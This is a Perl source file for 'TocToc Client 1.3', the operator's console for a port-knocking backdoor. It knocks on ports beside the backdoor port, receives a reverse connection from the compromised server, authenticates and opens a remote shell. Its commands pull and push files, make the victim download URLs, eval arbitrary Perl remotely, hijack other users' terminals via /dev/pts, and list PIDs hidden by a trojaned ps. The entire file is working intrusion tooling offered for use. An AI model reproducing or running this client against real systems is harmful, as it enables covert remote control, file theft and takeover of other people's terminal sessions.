   #!/usr/bin/perl
   # TocToc Client 1.3
   #
   #     0ldW0lf - oldwolf@atrixteam.net
   #             - old-wolf@zipmail.com
   #             - www.atrix.cjb.net
   #             - www.atrixteam.net
   #
   $SIG{WINCH} = \&winch; # So we gonna know if the
                          # terminal size has changed
   $SIG{INT}   = \&finish;

   use IO::Handle;
   use IO::Socket;
   use IO::Select;
   use Term::ReadKey;
   use Term::ReadLine;
   use Time::HiRes;
   use strict;

   # Some defines
   my $shell_hist_max = 60; # you can change that but dont need
   my $prompt = 'TocToc> ';
   my $VERSION = '1.3';
   my $auth = 0;
   my %SHELL_HIST;
   my $shell_hist_counter = 1;
   my $menu_act = 0;
   my $clear = `clear`;
   my $buffer = 4096;
   our $PROXY_PIPE;


   if ($#ARGV < 1) {
     print "TocToc Client $VERSION\n\n";
     print "   0ldW0lf - old-wolf\@zipmail.com\n";
     print "           - oldwolf\@atrixteam.net\n";
     print "           - www.atrixteam.net\n";
     print "           - www.atrix.cjb.net\n\n";
     print "Usage: $0 <ip/host> <port> [local port]\n\n";
     exit 1;
   }

   my $ip = $ARGV[0];
   my $porta = $ARGV[1];
   my $porta1 = $porta-1;
   my $porta2 = $porta+1;
   my $lport = $ARGV[2];


   my $sel = IO::Select->new();
   my $toctoc = Term::ReadLine->new("TocToc Client $VERSION");

   my @term_size = GetTerminalSize(\*STDIN);
   my $sel_transfer = IO::Select->new();
   STDOUT->autoflush(1);

   ############
   #   Help   #
   ############
   my %HELP;
   $HELP{get}{args}         = 2;
   $HELP{get}{about}        = "Get a file from the server.";
   $HELP{get}{help1}        = "This command opens a port to the data transfer.";
   $HELP{get}{help2}        = "Its not allowed to overwrite a file so, its checked";
   $HELP{get}{help3}        = "before the download start.";
   $HELP{get}{sintaxe}      = "get <remote file location> <local file location> [local bind port]";
   $HELP{get}{example}      = "get /dir/other/file /home/my_dir/file";

   $HELP{put}{args}         = 2;
   $HELP{put}{about}        = "Send a file to the server.";
   $HELP{put}{help1}        = "This commando works like the 'get' does but it";
   $HELP{put}{help2}        = "send the file instead to get. Type: help get";
   $HELP{put}{sintaxe}      = "put <local file location> <remote file location> [local bind port]";
   $HELP{put}{example}      = "put /home/my_dir/file /dir/other/file";

   $HELP{clear}{args}       = 0;
   $HELP{clear}{about}      = "Clear the TocToc prompt screen.";

   $HELP{pwd}{args}         = 0;
   $HELP{pwd}{about}        = "Show the PERL working directory on the server.";

   $HELP{lag}{args}         = 0;
   $HELP{lag}{about}        = "Messure the lag between you and the server.";
   $HELP{lag}{help1}        = "Show you the time it takes to a packet be sended and";
   $HELP{lag}{help2}        = "received in microseconds.";

   $HELP{hijack}{args}      = 1;
   $HELP{hijack}{about}     = "Hijack an opened tty.";
   $HELP{hijack}{help1}     = "All the typed stuff gonna be written in the terminal";
   $HELP{hijack}{help2}     = "so you can write commands in someone else terminal.";
   $HELP{hijack}{sintaxe}   = "hijack <device>";
   $HELP{hijack}{example}   = "hijack /dev/pts/1";

   $HELP{'eval'}{args}      = 1;
   $HELP{'eval'}{about}     = "Make the server evaluate a string.";
   $HELP{'eval'}{help1}     = "Is not recommended to do that unless you realy know";
   $HELP{'eval'}{help2}     = "what you are doing.";
   $HELP{'eval'}{sintaxe}   = "eval <perl code>";
   $HELP{'eval'}{example}   = "eval kill(9, \$\$);";

   $HELP{download}{args}    = 1;
   $HELP{download}{about}   = "Make the server download a file.";
   $HELP{download}{help1}   = "It downloads a ftp or a http link saving the file";
   $HELP{download}{help2}   = "in the PERL working directory. Type: 'help pwd' and 'help cd'";
   $HELP{download}{sintaxe} = "download <URL> [file localtion]";
   $HELP{download}{example} = "download http://www.atrix.cjb.net/files/TocToc-last.tgz";

   $HELP{socklist}{args}    = 0;
   $HELP{socklist}{about}   = "Prints the server socklist.";
   $HELP{socklist}{help1}   = "This command is exactly the socklist program.";
   $HELP{socklist}{help2}   = "It shows infos about the programs using a socket.";
   $HELP{socklist}{help3}   = "The suppoted protocol types are: TCP, UDP and RAW.";
   $HELP{socklist}{sintaxe} = "socklist [protocol]";
   $HELP{socklist}{example} = "socklist tcp";

   $HELP{leval}{args}       = 1;
   $HELP{leval}{about}      = "Make the client evaluate a string.";
   $HELP{leval}{help1}      = "Its exactly like 'eval' command but it is evaluated localy.";
   $HELP{leval}{help2}      = "Type: help eval";
   $HELP{leval}{sintaxe}    = "leval <perl code>";
   $HELP{leval}{example}    = "leval kill(9, \$\$);";

   $HELP{cd}{args}          = 1;
   $HELP{cd}{about}         = "Change the PERL working directory on the server";
   $HELP{cd}{sintaxe}       = "cd <directory>";
   $HELP{cd}{example}       = "cd /";

   $HELP{ps}{args}          = 0;
   $HELP{ps}{about}         = "Show remote hidden PIDs.";
   $HELP{ps}{help1}         = "This command execute 'ps ax' on the server and compare";
   $HELP{ps}{help2}         = "the result with the PIDs /proc and show you the hidden";
   $HELP{ps}{help3}         = "PIDs by the trojaned ps.";

   $HELP{'exit'}{args}      = 0;
   $HELP{'exit'}{about}     = "Close the connection and exit the program.";

   $HELP{help}{args}        = 0;

   my @commands = ("PUT", "GET", "DOWNLOAD", "LAG",
                   "EVAL", "LEVAL",
                   "CD", "PWD", "CLEAR",
                   "SOCKLIST", "PS", "HIJACK",
                   "EXIT");


   ###################################
   #  Connecting to backdoor server  #
   ###################################


   die("Could not listen on port $lport: $!") unless($lport = TestBindPort($lport));
   out("Listening on port: $lport\n");

   out("Sending packets sequence...\n");

   # packets senquency in 3 connections tries
   #
   # fist packet   -> 1 lower     # port to the backdoor's one
   # second packet -> 1 higher    #
   # third packet  -> the port the we gonna wait for its connection

   my $a = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ip", PeerPort=>$porta1,Timeout =>2);
   $a->close() if(defined($a)); sleep 2;
   my $b = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ip", PeerPort=>$porta2, Timeout =>2);
   $b->close() if(defined($b)); sleep 1;
   my $c = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ip", PeerPort=>$lport, Timeout =>2);
   $c->close() if(defined($c));

   # binding port
   my $bind = IO::Socket::INET->new(Listen=>1, LocalPort =>"$lport" ,Proto => 'tcp', Timeout=>15) || die "Could not listen on port $lport: $!";


   out("Waiting for the server connection...\n");

   # waiting for the conections with timeout of 15s especifyed on the binding ($bind)
   my $sock = $bind->accept();

   finish("Server didn´t connect!\n") unless($sock);
   out("Server has conected!\n\n");


   $bind->close(); # we can stop binding
   $sock->autoflush(1);
   $sel->add($sock);

   ###################
   #  Our main loop  #
   ###################

   while ( 1 ) {

     my @ready = $sel->can_read(1);
     foreach my $fh (@ready) {
       my $msg;
       my $nread = sysread($fh, $msg, $buffer);

       if ($fh eq $sock) {
         if ($nread == 0) {
           finish("\nDesconnected!\n");
         }
         if ($auth == 0) {
           if ($msg eq "\001\002\001\n") {
             ReadMode 2; # turns off echo back
             out("Password: ");
             my $senha = <STDIN>;
             ReadMode 0; # normal mode
             write_sock($senha);
           } elsif ($msg eq "\001\002\001\003\n") {
               out("\nWrong password!\n");
           } elsif ($msg eq "\002\001\002\n") {
               out("\nOK! We are in.\n");
               out("Escape char: ^H\n\n");
               spm("TERM_SIZE @term_size") if (defined(@term_size));
               STDIN->autoflush(1);
               $sel->add(\*STDIN);
               $auth = 1;
               ReadMode 4; # give us control of the typed keys
           }
         } else {
             write_out($msg);
         }
       } else {
           if (ord($msg) == 8) { # ^H
               active_menu();
           } else {
               write_sock($msg);
           }
       }
     }
   }
   ####################
   #       SUBS       #
   ####################

   ###############
   #    MENU     #
   ###############
   sub active_menu {
     $sel->remove(\*STDIN);
     ReadMode 0;
     $menu_act = 1;
     clear();
     menu();
   }

   sub desactive_menu {
     ReadMode 4;
     $sel->add(\*STDIN);
     $menu_act = 0;

     fhread(\*STDIN); # flush STDIN
     clear();
     show_shell_buff();
   }

   sub menu {
     while( defined (my $line = $toctoc->readline($prompt)) ) {
       if (lc($line) eq "shell") {
         desactive_menu();
         return;
       } else {
           parse_cmd($line) if ($line =~ /\S/);
       }
     }
   }

   #####################
   #  TocToc Commands  #
   #####################
   sub parse_cmd {
     my $cmd = shift;

     my (@args, $arg);
     $cmd =~ s/^\s+//;

     if ($cmd =~ /^(.+?)\s+(.*)/) {
       $cmd = lc($1);
       $arg = $2;
       @args = split(/ +/, $arg);
     } else {
        $cmd = lc($cmd);
     }

     unless (defined($HELP{$cmd})) {
       out("$cmd: command not found.\n");
       return(undef);
     }

     if (scalar(@args) < $HELP{$cmd}{args}) {
       HelpCMD($cmd);
       return(undef);
     }

     if ($cmd eq "help") {
       ShowHelp($args[0]);
       return();
     } elsif ($cmd eq "exit") {
        finish("Exiting...\n", $clear."C ya!\n");
     } elsif ($cmd eq "get") {
        get(@args);
     } elsif ($cmd eq "lag") {
        my $time = Time::HiRes::time();
        ask_cmd(uc($cmd), $time);
     } elsif ($cmd eq "put") {
        put(@args);
     } elsif ($cmd eq "hijack") {
        hijack("$arg");
     } elsif ($cmd eq "leval") {
        my $ret = eval "$arg";
        out("Evaluation returned: $ret\n");
     } elsif ($cmd eq "clear") {
         clear();
     } else {
        ask_cmd(uc($cmd), $arg);
     }
   }

   sub ask_cmd {
      my ($cmd, $arg) = @_;

      $arg = "0" unless($arg);
      ReadMode 4;

      $sock->autoflush(0);

      spm("$cmd $arg");

      my $res = '';

      while (<$sock>) { # if we dont do that the protocol
                        # messages may look like a normal one
        my $msg = $_;

        my $in = fhread(\*STDIN);
        if (defined($in) and grep { ord($_) == 3 } (split('', $in))) {
           spm("$cmd ABORT");
           clear_last();
           out("\nSended abort, waiting for the server abort...\n");
        }

        my $unparsed = $res.$msg;
        while($unparsed =~ /\001T:$cmd\s(.+?):\002\n/) {
          unless(parse_ans($cmd, $1)) {
            ReadMode 0;
            write_out($res);
            $sock->autoflush(0);
            return(1);
          }
          $unparsed =~ s/\001T:$cmd\s.+?:\002\n//;
        }
        $res = $unparsed;
      }
   }

   sub parse_ans {
     my ($cmd, $ans) = @_;

     return(undef) if ($ans eq "DONE");
     if ($cmd eq "DOWNLOAD") {
       my @n = split(' ', $ans);
       if (scalar(@n) != 3 ) {
         out("$ans\n");
       } else {
           ProgressBar(@n);
       }
     } elsif ($cmd eq "LAG") {
         my $time = Time::HiRes::time();
         my $lag = $time-$ans;
         out("Lag: $lag sec\n");
     } else {
         out("$ans\n");
     }
     return(1);
   }

   sub hijack {
     my $dev = shift;

     out("Type 'close' to exit.\n");
     print "[$dev]> ";
     while( my $line = <STDIN> ) {

       $line =~ s/\n$//;
       last if (lc($line) eq "close");

       ask_cmd("HIJACK", "$dev $line");
       print "[$dev]> ";

     }

   }



   sub get {
     my ($remote_file, $local_file, $bind_port) = @_;

     if (-e "$local_file") {
       out("File ($local_file) already exist.\n");
       return(undef);
     }

     unless(open(FILE, "> $local_file")) {
       out("Could not open file ($local_file) for writting.\n");
       return(undef);
     }

     return(undef) unless (my $port = TestTransferPort($bind_port));

     spm("GET $remote_file $port");

     return(undef) unless (SetUpTransfer($port));

     my ($msg, $total_bytes, $init_time);
     my $got_info = 0;
     my $cur_byte = 0;

     while ( 1 ) {
       my @ready = $sel_transfer->can_read(1);

       foreach my $fh (@ready) {

         my $nread = sysread($fh, $msg, $buffer);
         if ($nread == 0) {
           ShutDownTransfer("Connection lost!\n");
           close(FILE);
           return(undef);
         }
         if ($fh eq \*STDIN) {
           if (ord($msg) == 3) { # we got a ^C
             close(FILE);
             ShutDownTransfer("\nOperation aborted!\n");
             return(undef);
           }
         } else {
           if ($got_info == 0) {
             if ($msg =~ /^(\d+)$/) {
               $total_bytes = $1;
               clear_last();
               out("Status: Saving file in $local_file ($total_bytes bytes). Type ^C to abort.\n");
               syswrite($fh, 0, 1);
               $init_time = Time::HiRes::time();

             } else {
                 clear_last();
                 ShutDownTransfer("Server said: $msg\n");
                 close(FILE);
                 return(undef);
             }
             $got_info = 1;
           } else {
              my $size = length($msg);
              $cur_byte += $size;
              print FILE $msg;
              syswrite($fh, $cur_byte, length($cur_byte));

              ProgressBar($init_time, $cur_byte, $total_bytes);

              if ($cur_byte == $total_bytes) {
                ShutDownTransfer("\nTransferation completed! File has been saved.\n");
                close(FILE);
                return(1);
              }
           }
         }
       }
     }
   }

   sub put {
     my ($local_file, $remote_file, $bind_port) = @_;

     unless (-e "$local_file") {
       out("File ($local_file) doesn't exist.\n");
       return(undef);
     }

     unless(open(FILE, "< $local_file")) {
       out("Could not open file ($local_file) for reading.\n");
       return(undef);
     }

     return(undef) unless (my $port = TestTransferPort($bind_port));

     spm("PUT $remote_file $port");

     return(undef) unless (SetUpTransfer($port));

     my $msg;
     my $bytes = (stat("$local_file"))[7];;

     my $first_msg = 1;
     my $init_time;
     while ( 1 ) {
       my @ready = $sel_transfer->can_read(0);

       foreach my $fh (@ready) {
         my $nread = sysread($fh, $msg, $buffer);
         if ($nread == 0) {
           ShutDownTransfer("\nConnection lost!\n");
           close(FILE);
           return(undef);
         }
         if ($fh eq \*STDIN) {
           if (ord($msg) == 3) { # we got a ^C
             close(FILE);
             ShutDownTransfer("\nOperation aborted!\n");
             return(undef);
           }
         } else {
             if ($first_msg == 1) {
               $first_msg = 0;
               unless($msg eq "OK") {
                 clear_last();
                 ShutDownTransfer("Server said: $msg\n");
                 close(FILE);
                 return(undef);
               }
               syswrite($fh, $bytes, length($bytes));
               clear_last();
               out("Status: Sending file $local_file ($bytes bytes)\n");
               $init_time = Time::HiRes::time();
               next;
             }
             ProgressBar($init_time, $msg, $bytes) unless ($msg == 0);

             if ($msg == $bytes) {
                ShutDownTransfer("\nTransferation completed! File has been sended.\n");
                close(FILE);
                return(1);
             }
             my $send_bytes;
             seek(FILE, $msg, 0);
             read(FILE, $send_bytes, $buffer);
             syswrite($fh, $send_bytes, length($send_bytes));

         }
       }
     }
   }

   ##################
   # Transfer Stuff #
   ##################

   sub TestTransferPort {
     my $bind_port = shift;
     my $port = TestBindPort($bind_port);

     unless($port) {
       out("I could not listen on port: $bind_port\n");
       return(undef);
     }
     return($port);
   }

   sub SetUpTransfer {
     my $port = shift;

     my $transfer = IO::Socket::INET->new(Listen => 1, LocalPort => "$port", Proto => "tcp", Timeout => 10);

     unless($transfer) {
       out("Freak error on binding local port: $port\n");
       return(undef);
     }

     out("Status: Waiting for the server...");

     my $remote = $transfer->accept();
     unless ($remote) {
       clear_last();
       out("Status: Operation timed out! Server didn't connect.\n");
       return(undef);
     }

     clear_last();
     out("Status: Server connected!");

     my $port;
     $transfer->close;
     $remote->autoflush(1);

     $sel_transfer->add($remote);
     $sel_transfer->add(\*STDIN);
     ReadMode 4;
     return(1);
   }

   sub ShutDownTransfer {
     my $msg = shift;
     foreach my $fh ($sel_transfer->can_write(1)) {
       $sel_transfer->remove($fh);
       unless ($fh eq \*STDIN) {
         $fh->close() if(defined($fh));
       }
     }
     out($msg) if (defined($msg));
     ReadMode 0;
     sleep(1);
     return(1);
   }


   # i like the wget look so i based this function on it :)
   sub ProgressBar {
     my ($init_time, $saved_bytes, $total_bytes) = @_;

     # time  #
     my $d_time = (Time::HiRes::time())-$init_time;

     # size #
     my $unit = "Kb/s";
     my $Sps = ($saved_bytes/$d_time) / 1024;
     if ($Sps > 1024) {
        $Sps = $Sps/1024;
        $unit = "Mb/s";
     }
     $Sps = round($Sps, 2);


     # percentage #
     my $percent = ($saved_bytes*100)/$total_bytes;
     $percent = round($percent, 1);

     # i hope someone teach me a better way :/
     my $s_saved_bytes = reverse($saved_bytes);
     $s_saved_bytes =~ s/(...)/$1,/g;
     $s_saved_bytes = reverse($s_saved_bytes);
     $s_saved_bytes =~ s/^\,//;
     my $s_total_bytes = reverse($total_bytes);
     $s_total_bytes =~ s/(...)/$1,/g;
     $s_total_bytes = reverse($s_total_bytes);
     $s_total_bytes =~ s/^\,//;

     # cauculating ETA #
     my $eta_s = round(($d_time*($total_bytes-$saved_bytes))/$saved_bytes, 0);
     my $eta_h = int($eta_s/3600);
     $eta_s %= 3600;
     my $eta_m = int($eta_s/60);
     $eta_s %= 60;
     $eta_h = "0$eta_h" if (length($eta_h) == 1);
     $eta_m = "0$eta_m" if (length($eta_m) == 1);
     $eta_s = "0$eta_s" if (length($eta_s) == 1);

     # positionating the info on the screen #
     my $show_percent = fill_space($percent, 6);
     my $show_bytes = fill_space($s_saved_bytes, length($s_total_bytes));
     my $show_Sps = fill_space($Sps, 9);
     my $show_eta = fill_space("$eta_h:$eta_m:$eta_s", 9);
     $show_eta = "--:--:--" if (length($show_eta) > 9);

     my $total_chars = length(" $show_percent% [] $show_bytes  $show_Sps$unit  ETA $show_eta");

     # bars #
     my $total_bars = $term_size[0]-5-$total_chars;
     if($total_bars < 10) {
        out("Your terminal size is too small\r");
        return;
     }

     my $bar_per_byte = $total_bars/$total_bytes;
     my $bars_n = $bar_per_byte * $saved_bytes;

     # yeah u know 0.something may do this
     $bars_n = $total_bars if ($saved_bytes == $total_bytes);
     $bars_n-- if ($saved_bytes != $total_bytes and $bars_n == $total_bars);

     my $bars = "=" x $bars_n;
     my $blank_n = $total_bars-$bars_n;
     my $blank = " " x $blank_n;
     $bars =~ s/=$/>/ if ($bars =~ /=/ and $bars_n != $total_bars);
     $blank .= ' ' if ($total_bars != $bars_n);

     my $blank_end = " " x 5;

     out("\r $show_percent% \033[1m"."[$bars$blank]"."\033[0m $show_bytes  $show_Sps$unit  ETA $show_eta$blank_end");

   }

   #############
   #   HELP    #
   #############

   sub HelpCMD {
     my $cmd = shift;

     out("\n\033[1m  - ".uc($cmd)." - \033[0m\n\n");
     out("   \033[1mAbout\033[0m: ".$HELP{$cmd}{about}."\n\n");

     my $first = 1;

     for (my $c = 1; ; $c++) {
       unless(defined($HELP{$cmd}{"help$c"})) {
         out("\n") if ($first != 1);
         last;
       }
       if ($first == 1) {
         out("    \033[1mHelp\033[0m: ".$HELP{$cmd}{"help$c"}."\n");
         $first = 0;
       } else {
          out("          ".$HELP{$cmd}{"help$c"}."\n");
       }
     }
     out(" \033[1mSintaxe\033[0m: ".$HELP{$cmd}{sintaxe}."\n") if defined($HELP{$cmd}{sintaxe});
     out(" \033[1mExample\033[0m: ".$HELP{$cmd}{example}."\n") if defined($HELP{$cmd}{example});
     out("\n") if (defined($HELP{$cmd}{sintaxe}) or defined($HELP{$cmd}{example}));
   }

   sub ShowHelp {
     my $cmd = lc(shift);
     if ($cmd) {
       if ($cmd eq "help") {
          out("No help available for command help.\n");
       } elsif (grep { lc($_) eq $cmd } @commands ) {
           HelpCMD($cmd);
       } else {
           out("Command '$cmd' doesn't exist.\n");
       }
       return();
     }
     out("            \033[1mTocToc Help\033[0m\n\n");
     foreach my $command (@commands) {
       out(" \033[1m".fill_space($command, 10)."\033[0m - ".$HELP{lc($command)}{about}."\n");
     }
     out("\nType: help <command>\n\n");
   }





   #################
   #  Write Stuff  #
   #################
   sub clear {
     out($clear);
   }

   # Send Protocol Message
   # those messages are interpreted instead
   # of to be written on the shell
   sub spm {
     my $cmd = shift;
     write_sock("\001T:$cmd:\002\n");
   }

   # write directly to socket
   sub write_sock {
     my $msg = shift;
     return(syswrite($sock, $msg, length($msg)));
   }

   # the out() sends the args to STDOUT only
   # here we send it to the shell history too
   sub write_out {
     my $msg = shift;
     write_shell_hist($msg);
     out($msg) if ($menu_act == 0);
   }

   sub out {
     my $msg = join('', @_);
     syswrite(STDOUT, $msg, length($msg));
   }

   sub write_shell_hist {
     my $hist = shift;
     if (defined($SHELL_HIST{$shell_hist_counter})) {
       $SHELL_HIST{$shell_hist_counter} .= $hist;
     } else {
        $SHELL_HIST{$shell_hist_counter} = $hist;
     }
     $shell_hist_counter++;
   }

   ############
   #  Others  #
   ############

   # so we can read without blocking
   sub fhread {
     my $fh = shift;

     my $got_msg = '';
     my $msg;
     while ( my $ready = is_ready($fh)) {
       last if ($ready == 0);
       sysread($fh, $msg, $buffer);
       $got_msg .= $msg;
     }

     return($got_msg);
   }

   sub is_ready {
     my $fh = shift;
     my $read = '';
     vec($read, fileno($fh), 1) = 1;
     my $ready = 0;
     $ready = select($read, undef, undef, 0);
     return($ready);
   }

   sub fill_space {
     my ($chars, $max) = @_;
     my $filled = length($chars);
     my $space_n  = $max-$filled;
     return($chars) if ($space_n <= 0);

     my $space = " " x $space_n;

     return($space.$chars);
   }


   sub round {
     my ($number, $decimals) = @_;

     my ($int,$dec) = split('\.', $number);

     return("$int.".("0" x $decimals)) unless (defined($dec));

     my @dec_ns = split('', $dec);

     return("$int.$dec".("0" x ($decimals-(scalar(@dec_ns)))))
       if (scalar(@dec_ns) < $decimals);

     my $last_on_next = 0;
     for (my $c = $#dec_ns; $c >= 0; $c--) {
       if ($dec_ns[$c] >= 5) {
         if (($c-1) < 0) {
           $int++;
         } else {
            $dec_ns[$c-1]++;
         }
         $dec_ns[$c] = 0;
       }
       last if ($dec_ns[$c-1] != 10 and $last_on_next == 1);
       last if ($c == $decimals and $dec_ns[$c-1] != 10);
       $last_on_next = 1 if ($c < $decimals and $dec_ns[$c-1] != 10);
     }

     my $new_dec = join('', @dec_ns[0 .. ($decimals-1)]);

     my $dot = "." if ($decimals != 0);
     return("$int$dot$new_dec");
   }



   sub clear_last {
     my $spaces = " " x $term_size[0];
     out("\r$spaces\r");
   }


   sub TestBindPort {
     my $port = shift;

     if (defined($port)) {
       my $test = IO::Socket::INET->new(Listen=>1, LocalPort =>"$port",Proto => 'tcp') || return(undef);
       $test->close;
       return($port);
     } else {
         my $test = IO::Socket::INET->new(Listen=>1, Proto => 'tcp');
         my $port = $test->sockport;
         $test->close;
         return($port);
     }
   }


   sub show_shell_buff {
     my $lines = $term_size[1];

     my $from_c = $shell_hist_counter-$lines;
     $from_c = 1 if ($from_c < 0);

     clear();
     for (my $c = $from_c;  $c <= $shell_hist_counter ; $c++) {
       out($SHELL_HIST{$c}) if (defined($SHELL_HIST{$c}));
     }
   }

   #  With finish() we can exit in the right way
   sub finish {
     my ($msg1,$msg2) = @_;

     if ($msg1 eq "INT") {
       undef($msg1);
       if ($menu_act == 1) {
         out("\nType 'exit' instead.\n");
         return();
       }
     }

     out($msg1) if ($msg1);

     $sock->close() if (defined($sock));
     $bind->close() if (defined($bind));
     ReadMode 0;
     sleep(1);
     out($msg2) if ($msg2);
     exit(0);
   }

   # It tells the server that the terminal size has changed
   sub winch {
     @term_size = GetTerminalSize(\*STDIN);
     spm("TERM_SIZE @term_size") if (defined(@term_size));
     $clear = `clear`;
   }

